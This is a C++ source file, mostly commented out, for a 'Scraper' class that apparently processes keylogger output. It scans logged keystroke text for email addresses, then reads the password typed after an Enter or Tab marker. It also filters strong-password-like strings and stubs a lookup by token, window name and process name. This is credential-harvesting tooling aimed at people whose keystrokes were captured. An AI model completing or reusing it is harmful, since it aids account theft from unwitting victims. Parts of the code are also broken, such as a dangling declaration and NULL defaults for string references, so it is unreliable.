//
// Created by wurtz on 9/28/17.
//

#include <regex>
#include "Scraper.hpp"

// refactor email + password
// user split by special
// list title win

Scraper::Scraper(Database &database)
: _database(database)
{
}

Scraper::~Scraper()
{
}
/*

std::vector<std::map<std::string, std::string>>     Scraper::emailPassword(std::string log)
{
    std::regex                  regexEmail("[A-Za-z0-9-_\\.]+@[A-Za-z0-9\\.]+\\.[A-Za-z\\.]+");
    std::regex                  regexPassword("^[A-Za-z0-9-_\\.]+");
    std::regex                  regexSpecial("^ᚔENTERᚔ|^ᚔTABᚔ");
    std::smatch                 matchEmail;
    std::smatch                 matchPassword;
    std::smatch                 matchSpecial;
    std::vector<std::map<std::string, std::string>>    data;
    std::map<std::string, std::string>                 tmp;

    while (std::regex_search(log, matchEmail, regexEmail))
    {
        tmp["email"] = matchEmail.str();
        log = matchEmail.suffix();
        if (std::regex_search(log, matchSpecial, regexSpecial))
        {
            log = matchSpecial.suffix();
            if (std::regex_search(log, matchPassword, regexPassword))
            {
                tmp["password"] = matchPassword.str();
                log = matchPassword.suffix();
            }
        }
        data.push_back(tmp);
        tmp.clear();
    }
    return (data);
}

std::vector<std::string>            Scraper::password(std::string log)
{
    std::regex                      regexPassword("^.*(?=.{8,})(?=.*[a-zA-Z])(?=.*\\d)(?=.*[!#$%&?\"]).*$");
    std::smatch                     matchPassword;
    std::vector<std::string>        data;

    while (std::regex_search(log, matchPassword, regexPassword))
    {
        data.push_back(matchPassword.str());
        log = matchPassword.suffix();
        std::cout << "OK" << std::endl;
    }
    return (data);
}

std::map<std::string, std::vector<std::string>>  Scraper::getData(const std::string &token = NULL,
                                                                  const std::string &datetime = NULL,
                                                                  const std::string &windowName = NULL,
                                                                  const std::string &processName = NULL)
{
    std::map<std::string, std::vector<std::string>> data;
    std::vector<std::map<std::string, std::string>>

    return (data);
}*/